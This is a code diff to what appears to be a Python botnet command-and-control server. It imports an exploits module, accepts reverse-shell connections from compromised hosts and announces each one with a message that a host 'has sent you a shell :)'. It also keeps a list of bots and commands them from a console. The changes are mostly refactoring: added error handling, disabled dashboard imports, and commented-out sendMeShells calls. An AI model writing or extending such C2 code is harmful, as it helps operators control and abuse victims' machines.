@@ -4,8 +4,6 @@
 
 from exploits import *
 from Utilities import *
-from Dashboard.Dashboard import *
-from Dashboard.timeoutChecker import *
 from bot import *
 import socket
 import threading
@@ -469,13 +467,22 @@ Find a match
 name = ip
 """
 def find_bot(portNumber):
-    for bot in bots:
-        addr = bot.getConn()
-        port = bot.addr()
-        ip = bot.getip()
-        if portNumber == str(port):
-            return bot
-    return []
+    try:
+        for bot in bots:
+            addr = bot.getAddr()
+            ipAddress = addr[0]
+            port = addr[1]
+            ip = bot.getip()
+            if portNumber == str(port):
+                return bot
+        return []
+    except Exception as E:
+        print("find_bot()")
+        print(E)
+    except:
+        print("find_bot()")
+        pass
+
 
 """
 Find a match_Ping_List
@@ -547,9 +554,11 @@ def console():
             talk(bot)
             continue
         elif Command == "1":
-            sendMeShells(1)
+            pass
+            #sendMeShells(1)
         elif Command == "0":
-            sendMeShells(0)
+            pass
+            #sendMeShells(0)
         elif Command == "list":
             list()
         # Send a command to all bots
@@ -626,8 +635,8 @@ def mainSockFun(consoleT,mainSock):
     while consoleT.isAlive():
         try:
             conn, addr = mainSock.accept()
+            bots.append(Bot(conn, addr))
             print("\n"+str(addr[0])+":"+str(addr[1])+" has sent you a shell :). Go say thank you!")
-            bots.append(Bot(conn,addr))
         except:
             pass
     mainSock.close()
@@ -636,7 +645,7 @@ def mainSockFun(consoleT,mainSock):
 #TODO Handle threading errors.... Just in case.
 def main():
     # Start refreshBotsStatus for flask to get the data
-    threading.Timer( REFRESH_INTERVAL * 60.0, refreshBotsStatus).start()
+    #threading.Timer( REFRESH_INTERVAL * 60.0, refreshBotsStatus).start()
 
     # Maybe foeking a process is better than using a thread in case I stop this main process.
     # print("Starting flask..")
